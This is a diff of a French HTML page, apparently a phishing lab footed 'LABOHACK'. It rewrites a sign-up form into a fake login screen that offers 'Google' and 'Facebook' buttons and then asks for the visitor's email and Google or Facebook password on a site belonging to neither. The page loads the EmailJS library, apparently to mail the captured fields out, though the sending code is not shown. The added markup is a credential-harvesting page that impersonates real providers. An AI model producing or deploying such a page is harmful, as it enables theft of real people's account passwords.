@@ -10,89 +10,66 @@
   <div class="container">
     <nav>
       <a href="#">ACCUEIL</a>
-      <a href="#">A PROPOS</a>
-      <a href="#">FONCTIONNALITES</a>
+      <a href="#">À PROPOS</a>
+      <a href="#">FONCTIONNALITÉS</a>
       <a href="#">TARIFS</a>
       <a href="#">CONTACT</a>
     </nav>
 
-    <h1>CREER UN COMPTE</h1>
+    <h1>CONNEXION</h1>
 
-    <form id="signupForm">
-      <div class="field">
-        <label>NOM D'UTILISATEUR</label>
-        <input type="text" id="username" placeholder="Choisis un nom" required />
+    <!-- Écran de choix -->
+    <div id="choix">
+      <p style="color:#888; text-align:center;">Choisissez votre fournisseur</p>
+      <div style="display:flex; justify-content:center; gap:2rem; margin:1.5rem 0;">
+        <button id="btnGoogle" style="width:auto; padding:0.5rem 1.5rem; background:#2a2a2a; border:1px solid #555; color:#ccc;">
+          <span style="font-size:2rem;">G</span> Google
+        </button>
+        <button id="btnFacebook" style="width:auto; padding:0.5rem 1.5rem; background:#2a2a2a; border:1px solid #555; color:#ccc;">
+          <span style="font-size:2rem;">f</span> Facebook
+        </button>
       </div>
+    </div>
 
-      <div class="field">
-        <label>EMAIL</label>
-        <input type="email" id="email" placeholder="exemple@email.com" required />
+    <!-- Formulaire dynamique (caché initialement) -->
+    <div id="formContainer" style="display:none;">
+      <div id="formHeader" style="text-align:center; margin-bottom:1rem;">
+        <span id="providerIcon" style="font-size:2rem;">G</span>
+        <span id="providerName" style="color:#aaa; font-size:1.2rem; margin-left:0.5rem;">Google</span>
       </div>
-
-      <div class="field">
-        <label>MOT DE PASSE</label>
-        <input type="password" id="password" placeholder="********" required />
-        <div style="margin-top:0.3rem; display:flex; gap:1rem; align-items:center;">
-          <span id="strengthLabel" style="color:#666666;font-size:0.65rem;">force : —</span>
-          <div style="display:flex; gap:0.2rem;">
-            <span id="strengthBar1" class="strength-bar"></span>
-            <span id="strengthBar2" class="strength-bar"></span>
-            <span id="strengthBar3" class="strength-bar"></span>
+      <form id="signupForm">
+        <div class="field">
+          <label>EMAIL</label>
+          <input type="email" id="email" placeholder="exemple@email.com" required />
+        </div>
+        <div class="field">
+          <label id="pwdLabel">MOT DE PASSE GOOGLE</label>
+          <input type="password" id="password" placeholder="********" required />
+          <div style="margin-top:0.3rem; display:flex; gap:1rem; align-items:center;">
+            <span id="strengthLabel" style="color:#666;font-size:0.65rem;">force : —</span>
+            <div style="display:flex; gap:0.2rem;">
+              <span id="strengthBar1" class="strength-bar"></span>
+              <span id="strengthBar2" class="strength-bar"></span>
+              <span id="strengthBar3" class="strength-bar"></span>
+            </div>
           </div>
+          <button type="button" id="checkBtn" style="margin-top:0.4rem;padding:0.3rem 0.8rem;font-size:0.65rem;background:#2a2a2a;color:#aaa;border:1px solid #555;font-weight:bold;cursor:pointer;width:auto;">[ VÉRIFIER ]</button>
         </div>
-        <button type="button" id="checkBtn" style="margin-top:0.4rem;padding:0.3rem 0.8rem;font-size:0.65rem;background:#2a2a2a;color:#aaaaaa;border:1px solid #555555;font-weight:bold;cursor:pointer;width:auto;">[ VERIFIER ]</button>
-        <!-- PLUS AUCUN COMPTEUR -->
-      </div>
+        <!-- Le bouton Envoyer est masqué initialement -->
+        <button type="submit" id="submitBtn" style="display:none;">S'INSCRIRE</button>
+        <div style="text-align:center; margin:0.5rem 0; color:#666;">OU</div>
+        <button type="button" id="githubBtn" style="background:#1a1a1a; color:#aaa; border-color:#333;">S'INSCRIRE AVEC GITHUB</button>
+        <p style="text-align:center; color:#666; margin-top:1rem; font-size:0.7rem;">
+          Déjà un compte ? <a href="#" style="color:#888; text-decoration:none;">Se connecter</a>
+        </p>
+      </form>
+    </div>
 
-      <div class="field">
-        <label>PAYS</label>
-        <select id="country" required>
-          <option value="">Selectionne ton pays</option>
-          <option value="France">France</option>
-          <option value="Belgique">Belgique</option>
-          <option value="Suisse">Suisse</option>
-          <option value="Canada">Canada</option>
-          <option value="Senegal">Senegal</option>
-          <option value="Cote d'Ivoire">Cote d'Ivoire</option>
-          <option value="Madagascar">Madagascar</option>
-          <option value="Autre">Autre</option>
-        </select>
-      </div>
-
-      <div class="field">
-        <label>SEXE</label>
-        <div style="display:flex; gap:1.5rem; margin-top:0.3rem;">
-          <label style="color:#999999;font-size:0.7rem;"><input type="radio" name="gender" value="Homme" required /> Homme</label>
-          <label style="color:#999999;font-size:0.7rem;"><input type="radio" name="gender" value="Femme" /> Femme</label>
-          <label style="color:#999999;font-size:0.7rem;"><input type="radio" name="gender" value="Autre" /> Autre</label>
-        </div>
-      </div>
-
-      <div class="field">
-        <label>COMPTE FACEBOOK OU EMAIL</label>
-        <input type="text" id="social" placeholder="Ton identifiant Facebook ou email" />
-      </div>
-
-      <div class="field" style="margin:0.8rem 0;">
-        <label style="display:inline; font-size:0.6rem; color:#888888;">
-          <input type="checkbox" id="terms" required />
-          j'accepte les conditions d'utilisation
-        </label>
-      </div>
-
-      <button type="submit">S'INSCRIRE</button>
-      <div style="text-align:center; margin:0.5rem 0; color:#666666;">OU</div>
-      <button type="button" id="githubBtn" style="background:#1a1a1a; color:#aaaaaa; border-color:#333333;">S'INSCRIRE AVEC GITHUB</button>
-      <p style="text-align:center; color:#666666; margin-top:1rem; font-size:0.7rem;">
-        Deja un compte ? <a href="#" style="color:#888888; text-decoration:none;">Se connecter</a>
-      </p>
-    </form>
-
-    <div id="toast" class="toast hidden">donnees envoyees</div>
+    <div id="toast" class="toast hidden">données envoyées</div>
   </div>
 
   <footer>
-    <p>FAIT AVEC PASSION PAR NYAVO</p>
+    <p>LABOHACK</p>
   </footer>
 
   <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
